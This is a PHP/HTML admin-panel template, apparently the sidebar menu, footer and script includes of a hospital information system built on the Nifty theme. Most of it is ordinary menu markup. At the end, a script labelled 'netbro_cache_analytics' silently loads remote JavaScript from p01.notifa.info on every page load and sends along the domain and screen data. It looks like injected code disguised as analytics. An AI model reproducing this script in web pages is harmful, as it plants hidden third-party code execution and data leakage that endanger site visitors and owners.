            <span class="menu-title">Konten</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <li ><a href="<?php echo base_url('Berita');?>">Berita</a></li>
            <li  class="active-link"><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
            <li><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
            <li><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
        <li><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
            <li><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
        </ul>
    </li>
    <!--Menu list item-->
<?php }elseif($this->uri->segment('1') == 'Kegiatan'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">Konten</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <li ><a href="<?php echo base_url('Berita');?>">Berita</a></li>
            <li ><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
            <li class="active-link"><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
            <li><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
            <li><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
            <li><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
        </ul>
    </li>
    <!--Menu list item-->
    <?php }elseif($this->uri->segment('1') == 'Artikel'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">Konten</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <li ><a href="<?php echo base_url('Berita');?>">Berita</a></li>
            <li ><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
            <li><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
            <li  class="active-link"><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
            <li><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
            <li><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
        </ul>
    </li>
    <!--Menu list item-->
    <?php }elseif($this->uri->segment('1') == 'Promosi'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">Konten</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <li ><a href="<?php echo base_url('Berita');?>">Berita</a></li>
            <li ><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
            <li><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
            <li ><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
            <li class="active-link"><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
            <li><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
        </ul>
    </li>
    <!--Menu list item-->
<?php }elseif($this->uri->segment('1') == 'Dokumentasi'){ ?>
   <!--Menu list item-->
   <li class="active-sub">
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <span class="menu-title">Konten</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li ><a href="<?php echo base_url('Berita');?>">Berita</a></li>
        <li ><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
        <li ><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
        <li ><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
        <li ><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
        <li class="active-link"><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
    </ul>
</li>
<!--Menu list item-->
<?PHP }else{?>
   <!--Menu list item-->
   <li>
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <span class="menu-title">Konten</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li ><a href="<?php echo base_url('Berita');?>">Berita</a></li>
        <li ><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
        <li ><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
        <li ><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
        <li ><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
        <li><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
    </ul>
</li>
<!--Menu list item-->
<?php } ?>



<?php if($this->uri->segment('1') == 'Zona_integritas'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="<?php echo base_url('Zona_integritas');?>">
            <img src="<?php echo base_url('assets/admin/img/icon/zona_i.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Zona Integritas</span>
        </a>
    </li>
<?php }else{ ?>
 <!--Menu list item-->
 <li>
    <a href="<?php echo base_url('Zona_integritas');?>">
            <img src="<?php echo base_url('assets/admin/img/icon/zona_i.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Zona Integritas</span>
    </a>
</li>
<?php } ?>

<?php if($this->uri->segment('1') == 'Pengaduan_masyarakat'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="<?php echo base_url('Pengaduan_masyarakat');?>">
            <img src="<?php echo base_url('assets/admin/img/icon/zona_i.jpg')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Pengaduan Masyarakat</span>
        </a>
    </li>
<?php }else{ ?>
 <!--Menu list item-->
 <li>
    <a href="<?php echo base_url('Pengaduan_masyarakat');?>">
            <img src="<?php echo base_url('assets/admin/img/icon/zona_i.jpg')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Pengaduan Masyarakat</span>
    </a>
</li>
<?php } ?>

<?php if($this->uri->segment('1') == 'Laporan'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="<?php echo base_url('Laporan')?>">
        <img src="<?php echo base_url('assets/admin/img/icon/report.jpg')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-warning-window"></i> -->
            <span class="menu-title">Laporan (SKM dan SAKIP)</span>

        </a>
    </li>
<?php }else{ ?>    
  <!--Menu list item-->
  <li>
    <a href="<?php echo base_url('Laporan')?>">
        <img src="<?php echo base_url('assets/admin/img/icon/report.jpg')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-warning-window"></i> -->
        <span class="menu-title">Laporan (SKM dan SAKIP)</span>

    </a>
</li>
<?php } ?>
<?php if($this->uri->segment('1') == 'Ganti_pass'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/setting.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-computer-secure"></i> -->
            <span class="menu-title">Setting</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
            <li class="active-link"><a href="<?php echo base_url('Ganti_pass')?>">Ganti Password</a></li>
        </ul>
    </li>
<?php }else{ ?>
 <!--Menu list item-->
 <li>
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/setting.png')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-computer-secure"></i> -->
        <span class="menu-title">Setting</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
        <li><a href="<?php echo base_url('Ganti_pass')?>">Ganti Password</a></li>
    </ul>
</li>
<?php } ?>
</ul>


<!---------------ProKes------------------------>
<?php } elseif  ($status == 4 ) { ?>
 <ul id="mainnav-menu" class="list-group">
     <!--Category name-->
     <li class="list-header">Menu Utama</li>

     <?php if($this->uri->segment('1') == 'Beranda'){ ?>
        <!--Menu list item-->
        <li class="active-sub">
            <a href="<?php echo base_url('Beranda');?>">
                <!-- <i class="demo-pli-home"></i> -->
                <img src="<?php echo base_url('assets/admin/img/icon/beranda.png')?>" alt="" style="width:30px; height:30px ">
                <span class="menu-title">Beranda</span>
            </a>
        </li>
    <?php }else{ ?>
       <!--Menu list item-->
       <li>
        <a href="<?php echo base_url('Beranda');?>">
            <!-- <i class="demo-pli-home"></i> -->
            <img src="<?php echo base_url('assets/admin/img/icon/beranda.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Beranda</span>
        </a>
    </li>
<?php } ?>

<?php if($this->uri->segment('1') == 'Laporan'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="<?php echo base_url('Laporan')?>">
        <img src="<?php echo base_url('assets/admin/img/icon/report.jpg')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-warning-window"></i> -->
            <span class="menu-title">Laporan (SKM dan SAKIP)</span>

        </a>
    </li>
<?php }else{ ?>    
  <!--Menu list item-->
  <li>
    <a href="<?php echo base_url('Laporan')?>">
        <img src="<?php echo base_url('assets/admin/img/icon/report.jpg')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-warning-window"></i> -->
        <span class="menu-title">Laporan (SKM dan SAKIP)</span>

    </a>
</li>
<?php } ?>



<?php if($this->uri->segment('1') == 'Ganti_pass'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/setting.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-computer-secure"></i> -->
            <span class="menu-title">Setting</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
            <li class="active-link"><a href="<?php echo base_url('Ganti_pass')?>">Ganti Password</a></li>
        </ul>
    </li>
<?php }else{ ?>
 <!--Menu list item-->
 <li>
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/setting.png')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-computer-secure"></i> -->
        <span class="menu-title">Setting</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
        <li><a href="<?php echo base_url('Ganti_pass')?>">Ganti Password</a></li>
    </ul>
</li>
<?php } ?>
</ul>

<!---------------Perencanaan------------------------>
<?php } elseif  ($status == 5 ) { ?>
 <ul id="mainnav-menu" class="list-group">
     <!--Category name-->
     <li class="list-header">Menu Utama</li>
     <?php if($this->uri->segment('1') == 'Beranda'){ ?>
        <!--Menu list item-->
        <li class="active-sub">
            <a href="<?php echo base_url('Beranda');?>">
                <!-- <i class="demo-pli-home"></i> -->
                <img src="<?php echo base_url('assets/admin/img/icon/beranda.png')?>" alt="" style="width:30px; height:30px ">
                <span class="menu-title">Beranda</span>
            </a>
        </li>
    <?php }else{ ?>
       <!--Menu list item-->
       <li>
        <a href="<?php echo base_url('Beranda');?>">
            <!-- <i class="demo-pli-home"></i> -->
            <img src="<?php echo base_url('assets/admin/img/icon/beranda.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Beranda</span>
        </a>
    </li>
<?php } ?>
<?php if($this->uri->segment('1') == 'Laporan'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="<?php echo base_url('Laporan')?>">
        <img src="<?php echo base_url('assets/admin/img/icon/report.jpg')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-warning-window"></i> -->
            <span class="menu-title">Laporan (SKM dan SAKIP)</span>

        </a>
    </li>
<?php }else{ ?>    
  <!--Menu list item-->
  <li>
    <a href="<?php echo base_url('Laporan')?>">
        <img src="<?php echo base_url('assets/admin/img/icon/report.jpg')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-warning-window"></i> -->
        <span class="menu-title">Laporan (SKM dan SAKIP)</span>

    </a>
</li>
<?php } ?>

<?php if($this->uri->segment('1') == 'Ganti_pass'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/setting.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-computer-secure"></i> -->
            <span class="menu-title">Setting</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
            <li class="active-link"><a href="<?php echo base_url('Ganti_pass')?>">Ganti Password</a></li>
        </ul>
    </li>
<?php }else{ ?>
 <!--Menu list item-->
 <li>
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/setting.png')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-computer-secure"></i> -->
        <span class="menu-title">Setting</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
        <li><a href="<?php echo base_url('Ganti_pass')?>">Ganti Password</a></li>
    </ul>
</li>
<?php } ?>
</ul>
<?php } } ?>  
</div>
</div>
</div>
<!--================================-->
<!--End menu-->

</div>
</nav>
<!--===================================================-->
<!--END MAIN NAVIGATION-->





<!-- FOOTER -->
<!--===================================================-->
<footer id="footer">

    <!-- Visible when footer positions are fixed -->
    <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
    <div class="show-fixed pad-rgt pull-right">
        You have <a href="#" class="text-main"><span class="badge badge-danger">3</span> pending action.</a>
    </div>



    <!-- Visible when footer positions are static -->
    <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
    <div class="hide-fixed pull-right pad-rgt">
        14GB of <strong>512GB</strong> Free.
    </div>



    <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
    <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
    <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->

    <p class="pad-lft">Copyright &copy; 2022 By : SIRS - RSP Jember. All Rights Reserved.</p>



</footer>
<!--===================================================-->
<!-- END FOOTER -->


<!-- SCROLL PAGE BUTTON -->
<!--===================================================-->
<button class="scroll-top btn">
    <i class="pci-chevron chevron-up"></i>
</button>
<!--===================================================-->
</div>
<!--===================================================-->
<!-- END OF CONTAINER -->

<!--JAVASCRIPT-->
<!--=================================================-->

<!--jQuery [ REQUIRED ]-->
<script src="<?php echo base_url(); ?>assets/admin/js/jquery.min.js"></script>


<!--BootstrapJS [ RECOMMENDED ]-->
<script src="<?php echo base_url(); ?>assets/admin/js/bootstrap.min.js"></script>


<!--NiftyJS [ RECOMMENDED ]-->
<script src="<?php echo base_url(); ?>assets/admin/js/nifty.min.js"></script>


<!--=================================================-->


<!--Demo script [ DEMONSTRATION ]-->
<!-- <script src="<?php echo base_url(); ?>assets/admin/js/demo/nifty-demo.min.js"></script> -->


<!--Summernote [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/admin/plugins/summernote/summernote.min.js"></script>


<!--Mail [ SAMPLE ]-->
<script src="<?php echo base_url(); ?>assets/admin/js/demo/mail.js"></script>

<!--Sparkline [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/admin/plugins/sparkline/jquery.sparkline.min.js"></script>


<!--Specify page [ SAMPLE ]-->
<script src="<?php echo base_url(); ?>assets/admin/js/demo/dashboard.js"></script>


<!--Summernote [ OPTIONAL ]-->
<script src="<?php echo base_url(); ?>assets/admin/plugins/summernote/summernote.min.js"></script>


<!--Mail [ SAMPLE ]-->
<script src="<?php echo base_url(); ?>assets/admin/js/demo/mail.js"></script>


<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2CNaLknYAoSAvs98oacbv6DvMT%2f%2bY5LXMhffm4NwPkWsBjhVYydA5TgexA5TPuehJcf1rofsTxUshKgS6JGNbcp094lptdV%2faEEvmPBGT%2f%2bIUz8fPFAYVv1kyrePfLnn1OIfND64krcAPqYoRw9tD4jYuQc2I2CQdA43NL%2fz%2fgmSNsHp04Lxd9Zejir9TpvEeP6jajSbHKOwzztx84mRbvJ2WSeZLg6X3uDywp%2f9VMTLnTbijBZSQATZp7JFw69O%2b9miydF4%2ftpF1iSAlQ8cDhTq9Evag%2bbjXgK8x8W0oRTVSNKbgUsZ6PXKuaOcBD5wknwERS0uyfNvDliFbbvVG6reDMOEB5T6kw5vnX%2b3YnmxR3UyKwJcz0cPHteHN0gj28enWF0bPLTUbRdPr%2bJ2LDgjrM%2fFqOf7pVnse7V3lJUoRQ8alqU1dgfCQQv07ndsn2wiLGCto01k%2bzo5%2btBsCZzsY%2bLzIRBbdPD3d%2fAL1xBo%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
</script>


</body>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:04:50 GMT -->

</html>